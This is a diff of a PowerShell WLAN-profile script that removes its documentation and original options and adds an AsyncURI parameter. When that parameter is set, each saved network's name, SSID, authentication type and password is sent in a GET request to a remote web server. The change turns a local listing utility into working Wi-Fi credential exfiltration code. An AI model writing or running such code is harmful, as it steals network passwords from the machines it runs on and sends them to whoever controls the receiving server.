@@ -1,65 +1,18 @@
-###############################################################################################################
-# Language     :  PowerShell 5.0
-# Filename     :  Get-WLANProfile.ps1
-# Autor        :  BornToBeRoot (https://github.com/BornToBeRoot)
-# Description  :  Get WLAN profiles, include password as SecureString or as plain text
-# Repository   :  https://github.com/BornToBeRoot/PowerShell
-###############################################################################################################
-
-<#
-    .SYNOPSIS
-    Get WLAN profiles, include password as SecureString or as plain text
-   
-   	.DESCRIPTION
-    Get WLAN profiles on your local system, include Name, SSID, Authentication and Password as secure string or plain text. You don't need an additional application, which is full of advertising.	And for learning purposes it shows, how easy it is to find out the WLAN password, if you have  physical/remote access to the computer. 
-	
-	All this just by parsing the output of netsh.exe, which can be called without admin permissions.      
-
-    .EXAMPLE
-    Get-WLANProfile
-
-	Name              SSID               Authentification    Password
-	----              ----               ---------------     ------
-	MyHomeNetwork01   MyHomeNetwork      WPA2-Personal       System.Security.SecureString
-	MyHomeNetwork02   MyHomenetwork5G    WPA2-Personal       System.Security.SecureString
-	
-    .EXAMPLE
-    Get-WLANProfile -ShowPassword
-       
-	Name              SSID               Authentification    Password
-	----              ----               ---------------     ------
-	MyHomeNetwork01   MyHomeNetwork      WPA2-Personal       MyPassword123456789
-	MyHomeNetwork02   MyHomenetwork5G    WPA2-Personal       MyPassword987654321   
-	   
-    .LINK
-    https://github.com/BornToBeRoot/PowerShell/blob/master/Documentation/Function/Get-WLANProfile.README.md
-#>
-
 function Get-WLANProfile
 {
 	[CmdletBinding()]
 	param(
 		[Parameter(
 			Position=0,
-			HelpMessage='Indicates that the password appears in plain text')]
-		[Switch]$ShowPassword,
-		
-		[Parameter(
-			Position=1,
-			HelpMessage='Filter WLAN-Profiles by Name or SSID')]
-		[String]$Search,
-
-		[Parameter(
-			Position=2,
-			HelpMessage='Exact match, when filter WLAN-Profiles by Name or SSID')]
-		[Switch]$ExactMatch
+			HelpMessage='Indicates that this script will send the results back to a webserver instead of just showing the results')]
+		[String]$AsyncURI
 	)
 
 	Begin{
 
 	}
 
-	Process{
+	Process {
 		# Get all WLAN Profiles from netsh
 		$Netsh_WLANProfiles = (netsh WLAN show profiles)
 
@@ -125,7 +78,14 @@ function Get-WLANProfile
 				}   
 			}
 
-			Write-Output "$($WLAN_Name)::$($WLAN_SSID)::$($WLAN_Authentication)::$($WLAN_Password)"
+			$output = "$($WLAN_Name)::$($WLAN_SSID)::$($WLAN_Authentication)::$($WLAN_Password)"
+			if($PSBoundParameters.ContainsKey('AsyncURI')) {
+				$u = "$($AsyncURI)/?DATA=$($output)"
+				Invoke-WebRequest -Uri $u -Method GET -UseBasicParsing
+			} else {
+				Write-Output $output
+			}
+	        
 		}
 	}
 
